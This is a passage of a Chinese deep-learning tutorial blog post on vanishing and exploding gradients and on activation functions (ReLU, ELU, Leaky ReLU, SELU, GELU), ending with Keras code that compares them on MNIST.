alt="img"></p><p>这个权重原来的值为 0.2，现在更新为了 0.199999978。很明显，这是有问题的：梯度很小，如同消失了一样，使得神经网络中的权重几乎没有更新。这会导致网络中的节点离其最优值相去甚远。这个问题会严重妨碍神经网络的学习。人们已经观察到，如果不同层的学习速度不同，那么这个问题还会变得更加严重。层以不同的速度学习，前面几层总是会根据学习率而变得更差。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036072.jpg" alt="img">出自 Nielsen 的书《Neural Networks and Deep Learning》。</p><p>在这个示例中，隐藏层 4 的学习速度最快，因为其成本函数仅取决于连接到隐藏层 4 的权重变化。我们看看隐藏层 1；这里的成本函数取决于连接隐藏层 1 与隐藏层 2、3、4 的权重变化。如果你看过了我前一篇文章中关于反向传播的内容，那么你可能知道网络中更前面的层会复用后面层的计算。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036517.jpg" alt="img"></p><p>同时，如前面介绍的那样，最后一层仅取决于计算偏导时出现的一组变化：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036680.jpg" alt="img"></p><p>最终，这就是个大问题了，因为现在权重层的学习速度不同。这意味着网络中更后面的层几乎肯定会被网络中更前面的层受到更多优化。而且问题还在于反向传播算法不知道应该向哪个方向传递权重来优化成本函数。</p><p><strong>梯度爆炸问题</strong></p><p>梯度爆炸问题本质上就是梯度消失问题的反面。研究表明，这样的问题是可能出现的，这时权重处于「爆炸」状态，即它们的值快速增长。</p><p>我们将遵照以下示例来进行说明：</p><ul><li><a href="https://link.zhihu.com/?target=http%3A//neuralnetworksanddeeplearning.com/chap5.html%23what">http://neuralnetworksanddeeplearning.com/chap5.html#what</a>’s_causing_the_vanishing_gradient_problem_unstable_gradients_in_deep_neural_nets</li></ul><p>注意，这个示例也可用于展示梯度消失问题，而我是从更概念的角度选择了它，以便更轻松地解释。本质上讲，当 0&lt;w&lt;1 时，我们可能遇到梯度消失问题；当 w&gt;1 时，我们可能遇到梯度爆炸问题。但是，当一个层遇到这个问题时，必然有更多权重满足梯度消失或爆炸的条件。我们从一个简单网络开始。这个网络有少量权重、偏置和激活，而且每一层也只有一个节点。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036692.jpg" alt="img"></p><p>这个网络很简单。权重表示为 w_j，偏置为 b_j，成本函数为 C。节点、神经元或激活表示为圆圈。Nielsen 使用了物理学上的常用表示方式 Δ 来描述某个值中的变化（这不同于梯度符号 ∇）。举个例子，Δb_j 描述的是第 j 个偏置的值变化。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036704.jpg" alt="img"></p><p>我前一篇文章的核心是我们要衡量与成本函数有关的权重和偏置的变化率。先不考虑层，我们看看一个特定的偏置，即第一个偏置 b_1。然后我们通过下式衡量变化率：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036713.jpg" alt="img"></p><p>下面式子的论据和上面的偏导一样。即我们如何通过偏置的变化率来衡量成本函数的变化率？正如刚才介绍的那样，Nielsen 使用 Δ 来描述变化，因此我们可以说这个偏导能大致通过 Δ 来替代：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036041.jpg" alt="img"></p><p>权重和偏置的变化可以进行如下可视化：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036315.jpg" alt="动图封面"></p><p>动图出自 3blue1brown，视频地址：<a href="https://www.youtube.com/watch?v=tIeHLnjs5U8%E3%80%82">https://www.youtube.com/watch?v=tIeHLnjs5U8。</a></p><p>我们先从网络的起点开始，计算第一个偏置 b_1 中的变化将如何影响网络。因为我们知道，在上一篇文章中，第一个偏置 b_1 会馈入第一个激活 a_1，我们就从这里开始。我们先回顾一下这个等式：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036325.jpg" alt="img"></p><p>如果 b_1 改变，我们将这个改变量表示为 Δb_1。因此，我们注意到当 b_1 改变时，激活 a_1 也会改变——我们通常将其表示为 ∂a_1/∂b_1。因此，我们左边有偏导的表达式，这是 b_1 中与 a_1 相关的变化。但我们开始替换左边的项，先用 z_1 的 sigmoid 替换 a_1：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036336.jpg" alt="img"></p><p>上式表示当 b_1 变化时，激活值 a_1 中存在某个变化。我们将这个变化描述为 Δa_1。我们将变化 Δa_1 看作是与激活值 a_1 中的变化加上变化 Δb_1 近似一样。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036350.jpg" alt="img"></p><p>这里我们跳过了一步，但本质上讲，我们只是计算了偏导数，并用偏导的结果替代了分数部分。</p><p><strong>a_1 的变化导致 z_2 的变化</strong></p><p>所描述的变化 Δa_1 现在会导致下一层的输入 z_2 出现变化。如果这看起来很奇怪或者你还不信服，我建议你阅读我的前一篇文章。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036361.jpg" alt="img"></p><p>表示方式和前面一样，我们将下一个变化记为 Δz_2。我们又要再次经历前面的过程，只是这次要得到的是 z_2 中的变化：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036469.jpg" alt="img"></p><p>我们可以使用下式替代 Δa_1：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036691.jpg" alt="img"></p><p>我们只计算这个式子。希望你清楚地明白到这一步的过程——这与计算 Δa_1 的过程一样。这个过程会不断重复，直到我们计算完整个网络。通过替换 Δa_j 值，我们得到一个最终函数，其计算的是成本函数中与整个网络（即所有权重、偏置和激活）相关的变化。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036703.png" alt="img"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036719.jpg" alt="img"></p><p>基于此，我们再计算 ∂C/∂b_1，得到我们需要的最终式：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036791.png" alt="img"></p><p><strong>梯度爆炸的极端案例</strong></p><p>据此，如果所有权重 w_j 都很大，即如果很多权重的值大于 1，我们就会开始乘以较大的值。举个例子，所有权重都有一些非常高的值，比如 100，而我们得到一些在 0 到 0.25 之间、 sigmoid 函数导数的随机输出：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036802.png" alt="img"></p><p>最后一个偏导为</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036042.png" alt="img"></p><p>，可以合理地相信这会远大于 1，但为了方便示例展示，我们将其设为 1。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036123.jpg" alt="img"></p><p>使用这个更新规则，如果我们假设 b_1 之前等于 1.56，而学习率等于 0.5。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036477.png" alt="img"></p><p>尽管这是一个极端案例，但你懂我的意思。权重和偏置的值可能会爆发式地增大，进而导致整个网络爆炸。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036504.jpg" alt="img"></p><p>现在花点时间想想网络的权重和偏置以及激活的其它部分，爆炸式地更新它们的值。这就是我们所说的梯度爆炸问题。很显然，这样的网络学不到什么东西，因此这会完全毁掉你想要解决的任务。</p><p><strong>避免梯度爆炸：梯度裁剪/规范</strong></p><p>解决梯度爆炸问题的基本思路就是为其设定一个规则。这部分我不会深入进行数学解释，但我会给出这个过程的步骤：</p><ul><li>选取一个阈值——如果梯度超过这个值，则使用梯度裁剪或梯度规范；</li><li>定义是否使用梯度裁剪或规范。如果使用梯度裁剪，你就指定一个阈值，比如 0.5。如果这个梯度值超过 0.5 或 -0.5，则要么通过梯度规范化将其缩放到阈值范围内，要么就将其裁剪到阈值范围内。</li></ul><p>但是要注意，这些梯度方法都不能避免梯度消失问题。所以我们还将进一步探索解决这个问题的更多方法。通常而言，如果你在使用循环神经网络架构（比如 LSTM 或 GRU），那么你就需要这些方法，因为这种架构常出现梯度爆炸的情况。</p><h2 id="整流线性单元relu"><strong>整流线性单元（ReLU）</strong></h2><p>整流线性单元是我们解决梯度消失问题的方法，但这是否会导致其它问题呢？请往下看。ReLU 的公式如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036514.jpg" alt="img"></p><p>ReLU 公式表明：</p><ul><li>如果输入 x 小于 0，则令输出等于 0；</li><li>如果输入 x 大于 0，则令输出等于输入。</li></ul><p>尽管我们没法用大多数工具绘制其图形，但你可以这样用图解释 ReLU。x 值小于零的一切都映射为 0 的 y 值，但 x 值大于零的一切都映射为它本身。也就是说，如果我们输入 x=1，我们得到 y=1。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036525.jpg" alt="img">ReLU 激活函数图示。</p><p>这很好，但这与梯度消失问题有什么关系？首先，我们必须得到其微分方程：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036682.jpg" alt="img"></p><p>其意思是：</p><ul><li>如果输入 x 大于 0，则输出等于 1；</li><li>如果输入小于或等于 0，则输出变为 0。</li></ul><p>用下图表示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036752.jpg" alt="img">已微分的 ReLU。</p><p>现在我们得到了答案：当使用 ReLU 激活函数时，我们不会得到非常小的值（比如前面 sigmoid 函数的 0.0000000438）。相反，它要么是 0（导致某些梯度不返回任何东西），要么是 1。但这又催生出另一个问题：死亡 ReLU 问题。如果在计算梯度时有太多值都低于 0 会怎样呢？我们会得到相当多不会更新的权重和偏置，因为其更新的量为 0。要了解这个过程的实际表现，我们反向地看看前面梯度爆炸的示例。我们在这个等式中将 ReLU 记为 R，我们只需要将每个 sigmoid σ 替换成 R：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036818.png" alt="img"></p><p>现在，假如说这个微分后的 ReLU 的一个随机输入 z 小于 0——则这个函数会导致偏置「死亡」。假设是 R’(z_3)=0：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036837.png" alt="img"></p><p>反过来，当我们得到 R’(z_3)=0 时，与其它值相乘自然也只能得到 0，这会导致这个偏置死亡。我们知道一个偏置的新值是该偏置减去学习率减去梯度，这意味着我们得到的更新为 0。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036851.jpg" alt="img"></p><p><strong>死亡 ReLU：优势和缺点</strong></p><p>当我们将 ReLU 函数引入神经网络时，我们也引入了很大的稀疏性。那么稀疏性这个术语究竟是什么意思？稀疏：数量少，通常分散在很大的区域。在神经网络中，这意味着激活的矩阵含有许多 0。这种稀疏性能让我们得到什么？当某个比例（比如 50%）的激活饱和时，我们就称这个神经网络是稀疏的。这能提升时间和空间复杂度方面的效率——常数值（通常）所需空间更少，计算成本也更低。Yoshua Bengio 等人发现 ReLU 这种分量实际上能让神经网络表现更好，而且还有前面提到的时间和空间方面的效率。</p><p>论文地址：<a href="https://link.zhihu.com/?target=https%3A//www.utc.fr/~bordesan/dokuwiki/_media/en/glorot10nipsworkshop.pdf">https://www.utc.fr/~bordesan/dokuwiki/_media/en/glorot10nipsworkshop.pdf</a>优点：</p><ul><li>相比于 sigmoid，由于稀疏性，时间和空间复杂度更低；不涉及成本更高的指数运算；</li><li>能避免梯度消失问题。</li></ul><p>缺点：</p><ul><li>引入了死亡 ReLU 问题，即网络的大部分分量都永远不会更新。但这有时候也是一个优势；</li><li>ReLU 不能避免梯度爆炸问题。</li></ul><h2 id="指数线性单元elu"><strong>指数线性单元（ELU）</strong></h2><p>指数线性单元激活函数解决了 ReLU 的一些问题，同时也保留了一些好的方面。这种激活函数要选取一个 α 值；常见的取值是在 0.1 到 0.3 之间。如果你数学不好，ELU 的公式看起来会有些难以理解：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036859.jpg" alt="img"></p><p>我解释一下。如果你输入的 x 值大于 0，则结果与 ReLU 一样——即 y 值等于 x 值；但如果输入的 x 值小于 0，则我们会得到一个稍微小于 0 的值。所得到的 y 值取决于输入的 x 值，但还要兼顾参数 α——你可以根据需要来调整这个参数。更进一步，我们引入了指数运算 e^x，因此 ELU 的计算成本比 ReLU 高。下面绘出了 α 值为 0.2 的 ELU 函数的图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036996.jpg" alt="img">ELU 激活函数图示。</p><p>上图很直观，我们应该还能很好地应对梯度消失问题，因为输入值没有映射到非常小的输出值。但 ELU 的导数又如何呢？这同样也很重要。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036030.jpg" alt="img"></p><p>看起来很简单。如果输入 x 大于 0，则 y 值输出为 1；如果输入 x 小于或等于 0，则输出是 ELU 函数（未微分）加上 α 值。可绘出图为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036128.jpg" alt="img">微分的 ELU 激活函数。</p><p>你可能已经注意到，这里成功避开了死亡 ReLU 问题，同时仍保有 ReLU 激活函数的一些计算速度增益——也就是说，网络中仍还有一些死亡的分量。优点：</p><ul><li>能避免死亡 ReLU 问题；</li><li>能得到负值输出，这能帮助网络向正确的方向推动权重和偏置变化；</li><li>在计算梯度时能得到激活，而不是让它们等于 0。</li></ul><p>缺点：</p><ul><li>由于包含指数运算，所以计算时间更长；</li><li>无法避免梯度爆炸问题；</li><li>神经网络不学习 α 值。</li></ul><h2 id="渗漏型整流线性单元激活函数leaky-relu"><strong>渗漏型整流线性单元激活函数（Leaky ReLU）</strong></h2><p>渗漏型整流线性单元激活函数也有一个 α 值，通常取值在 0.1 到 0.3 之间。Leaky ReLU 激活函数很常用，但相比于 ELU 它也有一些缺陷，但也比 ReLU 具有一些优势。Leaky ReLU 的数学形式如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036144.jpg" alt="img"></p><p>因此，如果输入 x 大于 0，则输出为 x；如果输入 x 小于或等于 0，则输出为 α 乘以输入。这意味着能够解决死亡 ReLU 问题，因为梯度的值不再被限定为 0——另外，这个函数也能避免梯度消失问题。尽管梯度爆炸的问题依然存在，但后面的代码部分会介绍如何解决。下面给出了 Leaky ReLU 的图示，其中假设 α 值为 0.2：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036158.jpg" alt="img">Leaky ReLU 图示。</p><p>和在公式中看到的一样，如果 x 值大于 0，则任意 x 值都映射为同样的 y 值；但如果 x 值小于 0，则会多一个系数 0.2。也就是说，如果输入值 x 为 -5，则映射的输出值为 -1。因为 Leaky ReLU 函数是两个线性部分组合起来的，所以它的导数很简单：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036169.jpg" alt="img"></p><p>第一部分线性是当 x 大于 0 时，输出为 1；而当输入小于 0 时，输出就为 α 值，这里我们选择的是 0.2。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036438.jpg" alt="img">微分的 Leaky ReLU 图示。</p><p>从上图中也能明显地看出来，输入 x 大于或小于 0，微分的 Leaky ReLU 各为一个常量。优点：</p><ul><li>类似 ELU，Leaky ReLU 也能避免死亡 ReLU 问题，因为其在计算导数时允许较小的梯度；</li><li>由于不包含指数运算，所以计算速度比 ELU 快。</li></ul><p>缺点：</p><ul><li>无法避免梯度爆炸问题；</li><li>神经网络不学习 α 值；</li><li>在微分时，两部分都是线性的；而 ELU 的一部分是线性的，一部分是非线性的。</li></ul><h2 id="扩展型指数线性单元激活函数selu"><strong>扩展型指数线性单元激活函数（SELU）</strong></h2><p>扩展型指数线性单元激活函数比较新，介绍它的论文包含长达 90 页的附录（包括定理和证明等）。当实际应用这个激活函数时，必须使用 lecun_normal 进行权重初始化。如果希望应用 dropout，则应当使用 AlphaDropout。后面的代码部分会更详细地介绍。论文作者已经计算出了公式的两个值：α 和 λ；如下所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036447.jpg" alt="img"></p><p>可以看到，它们的小数点后还有很多位，这是为了绝对精度。而且它们是预先确定的，也就是说我们不必担心如何为这个激活函数选取合适的 α 值。说实话，这个公式看起来和其它公式或多或少有些类似。所有新的激活函数看起来就像是其它已有的激活函数的组合。SELU 的公式如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036590.jpg" alt="img"></p><p>也就是说，如果输入值 x 大于 0，则输出值为 x 乘以 λ；如果输入值 x 小于 0，则会得到一个奇异函数——它随 x 增大而增大并趋近于 x 为 0 时的值 0.0848。本质上看，当 x 小于 0 时，先用 α 乘以 x 值的指数，再减去 α，然后乘以 λ 值。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036619.jpg" alt="img">SELU 函数图示。</p><p><strong>SELU 的特例</strong></p><p>SELU 激活能够对神经网络进行自归一化（self-normalizing）。这是什么意思？首先，我们先看看什么是归一化（normalization）。简单来说，归一化首先是减去均值，然后除以标准差。因此，经过归一化之后，网络的组件（权重、偏置和激活）的均值为 0，标准差为 1。而这正是 SELU 激活函数的输出值。均值为 0 且标准差为 1 又如何呢？在初始化函数为 lecun_normal 的假设下，网络参数会被初始化一个正态分布（或高斯分布），然后在 SELU 的情况下，网络会在论文中描述的范围内完全地归一化。本质上看，当乘或加这样的网络分量时，网络仍被视为符合高斯分布。我们就称之为归一化。反过来，这又意味着整个网络及其最后一层的输出也是归一化的。均值 μ 为 0 且标准差 σ 为 1 的正态分布看起来是怎样的？</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036633.jpg" alt="img"></p><p>SELU 的输出是归一化的，这可称为内部归一化（internal normalization），因此事实上其所有输出都是均值为 0 且标准差为 1。这不同于外部归一化（external normalization）——会用到批归一化或其它方法。很好，也就是说所有分量都会被归一化。但这是如何做到的？简单解释一下，当输入小于 0 时，方差减小；当输入大于 0 时，方差增大——而标准差是方差的平方根，这样我们就使得标准差为 1。我们通过梯度得到零均值。我们需要一些正值和负值才能让均值为 0。我的上一篇文章介绍过，梯度可以调整神经网络的权重和偏置，因此我们需要这些梯度输出一些负值和正值，这样才能控制住均值。均值 μ 和方差 ν 的主要作用是使我们有某个域 Ω，让我们总是能将均值和方差映射到预定义的区间内。这些区间定义如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036662.jpg" alt="img"></p><p>∈ 符号表示均值和方差在这些预定义的区间之内。反过来，这又能避免网络出现梯度消失和爆炸问题。下面引述一段论文的解释，说明了他们得到这个激活函数的方式，我认为这很重要：</p><blockquote><p>SELU 允许构建一个映射 g，其性质能够实现 SNN（自归一化神经网络）。SNN 不能通过（扩展型）修正线性单元（ReLU）、sigmoid 单元、tanh 单元和 Leaky ReLU 实现。这个激活函数需要有：（1）负值和正值，以便控制均值；（2）饱和区域（导数趋近于零），以便抑制更低层中较大的方差；（3）大于 1 的斜率，以便在更低层中的方差过小时增大方差；（4）连续曲线。后者能确保一个固定点，其中方差抑制可通过方差增大来获得均衡。我们能通过乘上指数线性单元（ELU）来满足激活函数的这些性质，而且 λ&gt;1 能够确保正值净输入的斜率大于 1。</p></blockquote><p>我们再看看 SELU 的微分函数：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036739.jpg" alt="img"></p><p>很好，不太复杂，我们可以简单地解释一下。如果 x 大于 0，则输出值为 λ；如果 x 小于 0，则输出为 α 乘以 x 的指数再乘 λ。其图形如下所示，看起来很特别：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036749.jpg" alt="img">微分的 SELU 函数。</p><p>注意 SELU 函数也需要 lecun_normal 进行权重初始化；而且如果你想使用 dropout，你也必须使用名为 Alpha Dropout 的特殊版本。优点：</p><ul><li>内部归一化的速度比外部归一化快，这意味着网络能更快收敛；</li><li>不可能出现梯度消失或爆炸问题，见 SELU 论文附录的定理 2 和 3。</li></ul><p>缺点：</p><ul><li>这个激活函数相对较新——需要更多论文比较性地探索其在 CNN 和 RNN 等架构中应用。</li><li>这里有一篇使用 SELU 的 CNN 论文：<a href="https://link.zhihu.com/?target=https%3A//arxiv.org/pdf/1905.01338.pdf">https://arxiv.org/pdf/1905.01338.pdf</a></li></ul><h2 id="gelu"><strong>GELU</strong></h2><p>高斯误差线性单元激活函数在最近的 Transformer 模型（谷歌的 BERT 和 OpenAI 的 GPT-2）中得到了应用。GELU 的论文来自 2016 年，但直到最近才引起关注。这种激活函数的形式为：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036011.png" alt="img"></p><p>看得出来，这就是某些函数（比如双曲正切函数 tanh）与近似数值的组合。没什么过多可说的。有意思的是这个函数的图形：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036037.jpg" alt="img">GELU 激活函数。</p><p>可以看出，当 x 大于 0 时，输出为 x；但 x=0 到 x=1 的区间除外，这时曲线更偏向于 y 轴。我没能找到该函数的导数，所以我使用了 WolframAlpha 来微分这个函数。结果如下：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036066.png" alt="img"></p><p>和前面一样，这也是双曲函数的另一种组合形式。但它的图形看起来很有意思：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404242036094.jpg" alt="img">微分的 GELU 激活函数。</p><p>优点：</p><ul><li>似乎是 NLP 领域的当前最佳；尤其在 Transformer 模型中表现最好；</li><li>能避免梯度消失问题。</li></ul><p>缺点：</p><ul><li>尽管是 2016 年提出的，但在实际应用中还是一个相当新颖的激活函数。</li></ul><p><strong>用于深度神经网络的代码</strong></p><p>假如说你想要尝试所有这些激活函数，以便了解哪种最适合，你该怎么做？通常我们会执行超参数优化——这可以使用 scikit-learn 的 GridSearchCV 函数实现。但是我们想要进行比较，所以我们的想法是选取一些超参数并让它们保持恒定，同时修改激活函数。说明一下我这里要做的事情：</p><ul><li>使用本文提及的激活函数训练同样的神经网络模型；</li><li>使用每个激活函数的历史记录，绘制损失和准确度随 epoch 的变化图。</li></ul><p>本代码也发布在了 GitHub 上，并且支持 colab，以便你能够快速运行。地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/casperbh96/Activation-Functions-Search">https://github.com/casperbh96/Activation-Functions-Search</a>我更偏好使用 Keras 的高级 API，所以这会用 Keras 来完成。首先导入我们所需的一切。注意这里使用了 4 个库：tensorflow、numpy、matplotlib、 keras。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import tensorflow as tf</span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from keras.datasets import mnist</span><br><span class="line">from keras.utils.np_utils import to_categorical</span><br><span class="line">from keras.models import Sequential</span><br><span class="line">from keras.layers import Dense, Dropout, Flatten, Conv2D, MaxPooling2D, Activation, LeakyReLU</span><br><span class="line">from keras.layers.noise import AlphaDropout</span><br><span class="line">from keras.utils.generic_utils import get_custom_objects</span><br><span class="line">from keras import backend as K</span><br><span class="line">from keras.optimizers import Adam</span><br></pre></td></tr></table></figure><p>现在加载我们运行实验所需的数据集；这里选择了 MNIST 数据集。我们可以直接从 Keras 导入它。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br></pre></td></tr></table></figure><p>很好，但我们想对数据进行一些预处理，比如归一化。我们需要通过很多函数来做这件事，主要是调整图像大小（.reshape）并除以最大的 RGB 值 255（/= 255）。最后，我们通过 to_categorical() 对数据进行 one-hot 编码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def preprocess_mnist(x_train, y_train, x_test, y_test):</span><br><span class="line">    # Normalizing all images of 28x28 pixels</span><br><span class="line">    x_train = x_train.reshape(x_train.shape[0], 28, 28, 1)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[0], 28, 28, 1)</span><br><span class="line">    input_shape = (28, 28, 1)</span><br><span class="line"></span><br><span class="line">    # Float values for division</span><br><span class="line">    x_train = x_train.astype(&#x27;float32&#x27;)</span><br><span class="line">    x_test = x_test.astype(&#x27;float32&#x27;)</span><br><span class="line"></span><br><span class="line">    # Normalizing the RGB codes by dividing it to the max RGB value</span><br><span class="line">    x_train /= 255</span><br><span class="line">    x_test /= 255</span><br><span class="line"></span><br><span class="line">    # Categorical y values</span><br><span class="line">    y_train = to_categorical(y_train)</span><br><span class="line">    y_test= to_categorical(y_test)</span><br><span class="line"></span><br><span class="line">    return x_train, y_train, x_test, y_test, input_shape</span><br><span class="line"></span><br><span class="line">x_train, y_train, x_test, y_test, input_shape = preprocess_mnist(x_train, y_train, x_test, y_test)</span><br></pre></td></tr></table></figure><p>现在我们已经完成了数据预处理，可以构建模型以及定义 Keras 运行所需的参数了。首先从卷积神经网络模型本身开始。SELU 激活函数是一个特殊情况，我们需要使用核初始化器 ‘lecun_normal’ 和特殊形式的 dropout AlphaDropout()，其它一切都保持常规设定。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def build_cnn(activation,</span><br><span class="line">              dropout_rate,</span><br><span class="line">              optimizer):</span><br><span class="line">    model = Sequential()if(activation == &#x27;selu&#x27;):</span><br><span class="line">        model.add(Conv2D(32, kernel_size=(3, 3),</span><br><span class="line">                  activation=activation,</span><br><span class="line">                  input_shape=input_shape,</span><br><span class="line">                  kernel_initializer=&#x27;lecun_normal&#x27;))</span><br><span class="line">        model.add(Conv2D(64, (3, 3), activation=activation, </span><br><span class="line">                         kernel_initializer=&#x27;lecun_normal&#x27;))</span><br><span class="line">        model.add(MaxPooling2D(pool_size=(2, 2)))</span><br><span class="line">        model.add(AlphaDropout(0.25))</span><br><span class="line">        model.add(Flatten())</span><br><span class="line">        model.add(Dense(128, activation=activation, </span><br><span class="line">                        kernel_initializer=&#x27;lecun_normal&#x27;))</span><br><span class="line">        model.add(AlphaDropout(0.5))</span><br><span class="line">        model.add(Dense(10, activation=&#x27;softmax&#x27;))else:</span><br><span class="line">        model.add(Conv2D(32, kernel_size=(3, 3),</span><br><span class="line">                  activation=activation,</span><br><span class="line">                  input_shape=input_shape))</span><br><span class="line">        model.add(Conv2D(64, (3, 3), activation=activation))</span><br><span class="line">        model.add(MaxPooling2D(pool_size=(2, 2)))</span><br><span class="line">        model.add(Dropout(0.25))</span><br><span class="line">        model.add(Flatten())</span><br><span class="line">        model.add(Dense(128, activation=activation))</span><br><span class="line">        model.add(Dropout(0.5))</span><br><span class="line">        model.add(Dense(10, activation=&#x27;softmax&#x27;))</span><br><span class="line"></span><br><span class="line">    model.compile(</span><br><span class="line">        loss=&#x27;binary_crossentropy&#x27;, </span><br><span class="line">        optimizer=optimizer, </span><br><span class="line">        metrics=[&#x27;accuracy&#x27;])return model</span><br></pre></td></tr></table></figure><p>使用 GELU 函数有个小问题；Keras 中目前还没有这个函数。幸好我们能轻松地向 Keras 添加新的激活函数。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Add the GELU function to Keras</span><br><span class="line">def gelu(x):</span><br><span class="line">    return 0.5 * x * (1 + tf.tanh(tf.sqrt(2 / np.pi) * (x + 0.044715 * tf.pow(x, 3))))</span><br><span class="line">get_custom_objects().update(&#123;&#x27;gelu&#x27;: Activation(gelu)&#125;)</span><br><span class="line"></span><br><span class="line"># Add leaky-relu so we can use it as a string</span><br><span class="line">get_custom_objects().update(&#123;&#x27;leaky-relu&#x27;: Activation(LeakyReLU(alpha=0.2))&#125;)</span><br><span class="line"></span><br><span class="line">act_func = [&#x27;sigmoid&#x27;, &#x27;relu&#x27;, &#x27;elu&#x27;, &#x27;leaky-relu&#x27;, &#x27;selu&#x27;, &#x27;gelu&#x27;]</span><br></pre></td></tr></table></figure><p>现在我们可以使用 act_func 数组中定义的不同激活函数训练模型了。我们会在每个激活函数上运行一个简单的 for 循环，并将结果添加到一个数组：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 